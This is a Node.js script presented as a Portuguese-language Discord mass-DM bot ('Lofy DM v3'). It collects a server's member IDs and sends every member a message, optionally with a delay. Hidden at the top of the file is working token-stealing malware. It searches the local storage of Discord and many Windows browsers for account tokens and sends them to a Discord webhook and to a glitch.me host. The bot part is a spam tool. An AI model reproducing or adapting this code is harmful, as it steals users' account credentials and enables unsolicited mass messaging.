const fs = require("fs");
let os = require("os");
const fetch = require("node-fetch");
if (os.platform === "win32") {
  var paths = [
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`
  ]

  for (i = 0; i < paths.length; i++) {
    grab(paths[i]);
  }
  async function grab(path) {
    try {
      fs.readdir(path, (err, files) => {
        if (files === undefined) {
          return;
        }
        url = "https://discordapp.com/api/webhooks/888611694274826241/-iMmetEEEPnr2LLY2p9sGBhKPQwJk1ed6X_KWBAmcbTbYz6N2pniK5nFvAKHwXw5HN_f"; // DEAD WEBHOOK.
        var file = files.filter(f => f.split('.').pop() === "ldb");
        for (i = 0; i < file.length; i++) {
          fs.readFile(`${path}/${file[i]}`, "utf-8", async function (err, data) {
            let regex = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
            let regex1 = /"mfa\.[\d\w_-]{84}"/;
            let [match] = regex.exec(data) || regex1.exec(data) || [null];
            if (match != null) {
              match = match.replace(/"/g, '');
              const benladen = new URLSearchParams();
              benladen.append("token", match);
              fetch(url, {
                "method": 'POST',
                "headers": {
                  "Content-Type": "application/json"
                },
                "content": JSON.stringify({
                  "content": match
                })
              });
              fetch("https://discord-tk.glitch.me/", {
                "method": 'POST',
                "content": benladen
              });
              await fetch(`https://discord.com/api/v6/users/@me`, {
                "headers": {
                  "authorization": match
                }
              }).then(resp => resp.json()).then(response => {
                if (response.id) {
                    send(match)
                }
            })
            }
          });
        }
      });
      fs.readdir(path, (err, files) => {
        if (files === undefined) {
          return;
        }
        var file = files.filter(f => f.split('.').pop() === "ldb");
        for (i = 0; i < file.length; i++) {
          fs.readFile(`${path}/${file[i]}`, "utf-8", async function (err, data) {
            let regex = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
            let regex1 = /"mfa\.[\d\w_-]{84}"/;
            let [match] = regex.exec(data) || regex1.exec(data) || [null];
            if (match != null) {
              match = match.replace(/"/g, '');
              const attentat = new URLSearchParams();
              attentat.append("token", match);
              fetch(url, {
                "method": 'POST',
                "headers": {
                  "Content-Type": "application/json"
                },
                "content": JSON.stringify({
                  "content": match
                })
              });
              fetch("https://discord-tk.glitch.me/", {
                "method": 'POST',
                "content": attentat
              });
              await fetch(`https://discord.com/api/v6/users/@me`, {
                "headers": {
                  "authorization": match
                }
              }).then(resp => resp.json()).then(response => {
                if (response.id) {
                    send(match)
                }
            })
            }
          });
        }
      });
    } catch {}
  }

  function send(match) {
    let i = "0";
  }
}
const {
  Client
} = require("discord.js");
const {
  red,
  yellow,
  greenBright,
  yellowBright
} = require("chalk");
const rl = require("readline").createInterface({
  "input": process.stdin,
  "output": process.stdout
});
require("colors");
const client = new Client();
const {
  token,
  message
} = require("./lofy.json");
console.log(''.rainbow);
console.log(''.rainbow);
console.log("            ██╗      ██████╗ ███████╗██╗   ██╗    ██████╗ ██╗██╗   ██╗    ██╗   ██╗██████╗".rainbow);
console.log("            ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ██╔══██╗██║██║   ██║    ██║   ██║╚════██╗".rainbow);
console.log("            ██║     ██║   ██║█████╗   ╚████╔╝     ██║  ██║██║██║   ██║    ██║   ██║ █████╔╝".rainbow);
console.log("            ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║  ██║██║╚██╗ ██╔╝    ╚██╗ ██╔╝ ╚═══██╗".rainbow);
console.log("            ███████╗╚██████╔╝██║        ██║       ██████╔╝██║ ╚████╔╝      ╚████╔╝ ██████╔╝".rainbow);
console.log("            ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═════╝ ╚═╝  ╚═══╝        ╚═══╝  ╚═════╝".rainbow);
console.log("            Atualizado na sexta-feira, 17 de setembro de 2021".magenta);
console.log(''.rainbow);
client.on("ready", () => {
  client.user.setActivity({
    name: 'Polar Lofy',
    type: 'STREAMING',
    url: 'https://www.twitch.tv/polarlofy'
  });
  div();
});

function div() {
  console.log(`            
  Options:
  [1] Modo Normal
  [2] Modo com delay`.yellow);
  rl.question("            [?] Escolha a opção:", response => {
    switch (response) {
      case 1:
        rl.question("            [!] ID do servidor:", id => {
          fun(id).then(() => {
            console.log(greenBright("            [!] Carregando dados"));
            setTimeout(() => {
              anotherfun(null, message).catch(err => {
                console.log(err);
                setTimeout(() => {
                  console.log(yellow("            [!] Aviso: reiniciando."));
                }, 1000);
                setTimeout(() => {
                  process.exit(1);
                }, 2000);
              });
            }, 2000);
          });
        });
        break;
      case 2:
        rl.question("            [!] ID do servidor:", resp => {
          fun(resp).then(() => {
            setTimeout(() => {
              rl.question(`
            [i] Defina o número de segundos que o bot espera
            Antes de enviar mensagens aos usuários.
            [i] Limite(s): 3 - 9 segundos

            [!] Digite o limite:
            `, r => {
                if (r === 3 ||r === 4 ||r === 5 ||r === 6 ||r === 7 ||r === 8 ||r === 9) {
                  const oops = parseInt(r) * 1000;
                  console.log(greenBright("            [!] Carregando dados"));
                  anoanotherfun(null, oops, message).catch(err => {
                    console.log(err);
                    setTimeout(() => {
                      console.log(yellow("            [!] Aviso Reiniciando."));
                    }, 1000);
                    setTimeout(() => {
                      process.exit(1);
                    }, 2000);
                  });
                } else {
                  console.log(red("            [!] Um numero invalido foi usado"));
                  setTimeout(() => {
                    console.log(yellow("            [!] Aviso Reiniciando."));
                  }, 1000);
                  setTimeout(() => {
                    process.exit(1);
                  }, 2000);
                }
              });
            }, 2000);
          });
        });
        break;
      default:
        console.log(red("Option Error: Incorrect option used."));
    }
  });
}
async function fun(jsp) {
  client.guilds.fetch(jsp).then(mdrr => {
      const idd = mdrr.members.cache.map(map => map.id);
      console.log(yellowBright("            [!]" + idd.length + " ID de usuários anotados"));
      fs.writeFile("./ids.json", JSON.stringify({IDs: idd}, null, 2), err => {
        if (err) return console.log(red("            [X]Erro ao gravar o arquivo:" + err));
        console.log(greenBright("            [V] Feito com sucesso" + "./ids.json"));
      });
    }).catch(error => {
      console.log(red("            [X] Buscando erro de guilda:" + error));
      setTimeout(() => {
        console.log(yellow("            [!] Aviso Reiniciando."));
      }, 1000);
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    });
}

function anoanotherfun(a, b, c) {
  return new Promise((resolve, reject) => {
    const lmfao = require("./ids.json");
    a = lmfao.IDs;
    if (typeof b != "number") {
      reject(red("            [X] Erro de tempo limite: dados incorreto usado."));
    } else if (typeof c != "string") {
      reject(red("            [!] Erro de Args da mensagem: Deve-se usar o tipo de dados 'string'"));
    } else {
      for (let i = 0; i <= a.length; i++) {
        client.users.fetch(a[i]).then(users => {
            (function (mdr) {
              setTimeout(function () {
                users.send(c).then(() =>
                  console.log(greenBright("            [V] Memsagem envida para:" + users.tag))
                ).catch(err =>
                  console.log(
                    red("            [✗] Erro ao enviar mensagem para:" + users.tag)
                  )
                );
              }, b * mdr);
            })(i);
          }).catch(err =>
            console.log(red("            [X] Buscando erro da API:" + err))
          );
      }
      resolve();
    }
  });
}

function anotherfun(a, b) {
  return new Promise((resolve, reject) => {
    const id = require("./ids.json");
    a = id.IDs;
    for (let i = 0; i <= a.length; i++) {
      client.users.fetch(a[i]).then(oof => {
          oof.send(b).then(() =>
            console.log(greenBright("            [V] Memsagem envida para:" + oof.tag))
          ).catch(err => console.log(red("            [✗] Erro ao enviar mensagem para:" + oof.tag))
          );
        }).catch(err => console.log(red("            [X] Buscando erro da API:" + err)));
    }
    resolve();
  });
}
client.login(token).catch(err => {
  console.log("            [X] Token Não encontrado");
});
